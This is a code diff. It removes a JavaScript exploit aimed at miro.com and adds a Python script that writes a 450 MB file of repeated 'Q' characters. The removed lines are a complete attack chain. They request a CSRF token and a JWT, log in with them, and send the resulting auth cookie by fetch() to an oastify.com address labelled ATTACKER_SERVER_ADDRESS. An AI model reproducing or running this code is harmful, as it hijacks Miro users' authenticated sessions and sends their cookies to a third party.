@@ -1,54 +1,16 @@
-const ATTACKER_SERVER_ADDRESS = "https://y32pksgbdxobfmipricm1cmyxp3gr6fv.oastify.com/?data="; // Place your server address for get authentication cookie (must be https)
+import os
 
-const getCsrfToken = function () {
-  return new Promise((resolve) => {
-    const xhr = new XMLHttpRequest();
-    xhr.open("POST", "https://miro.com/api/v1/csrf");
-    xhr.withCredentials = true;
-    xhr.addEventListener("readystatechange", function () {
-      if (xhr.readyState === xhr.DONE) {
-        const csrfToken = JSON.parse(xhr.responseText).token;
-        resolve(csrfToken);
-      }
-    });
-    xhr.send();
-  });
-};
+# The target size in megabytes
+target_size_mb = 450
 
-const getJwt = async function () {
-  const csrfToken = await getCsrfToken();
-  return new Promise((resolve) => {
-    const xhr = new XMLHttpRequest();
-    xhr.open("POST", "https://miro.com/api/v1/auth/jwt/generate");
-    xhr.withCredentials = true;
-    xhr.addEventListener("readystatechange", function () {
-      if (xhr.readyState === xhr.DONE) {
-        const JWT = JSON.parse(xhr.responseText).jwt;
-        resolve(JWT);
-      }
-    });
-    xhr.setRequestHeader("Content-Type", "application/json");
-    xhr.setRequestHeader("X-Csrf-Token", csrfToken);
-    xhr.send();
-  });
-};
+chunk = "Q" * 35 
+chunk_bytes = chunk.encode("utf-8")
+chunk_size = len(chunk_bytes)
+target_size_bytes = target_size_mb * 1024 * 1024
+repeats = target_size_bytes // chunk_size
+content = chunk * repeats
+output_path = f"generated_{target_size_mb}MB.txt"
+with open(output_path, "w", encoding="utf-8") as f:
+    f.write(content)
 
-const getAuthCookie = async function () {
-  const JWT = await getJwt();
-  const csrfToken = await getCsrfToken();
-  const xhr = new XMLHttpRequest();
-  xhr.open("POST", "https://miro.com/api/v1/auth/jwt/login");
-  xhr.withCredentials = true;
-  xhr.addEventListener("readystatechange", function () {
-    if (xhr.readyState === xhr.DONE) {
-      const authCookie = JSON.parse(xhr.responseText).hash;
-      fetch(ATTACKER_SERVER_ADDRESS + authCookie);
-    }
-  });
-  xhr.setRequestHeader("Content-Type", "application/json");
-  xhr.setRequestHeader("X-Csrf-Token", csrfToken);
-  const data = JSON.stringify({ jwt: JWT });
-  xhr.send(data);
-};
-
-getAuthCookie();
+print(f"File saved as: {output_path}")
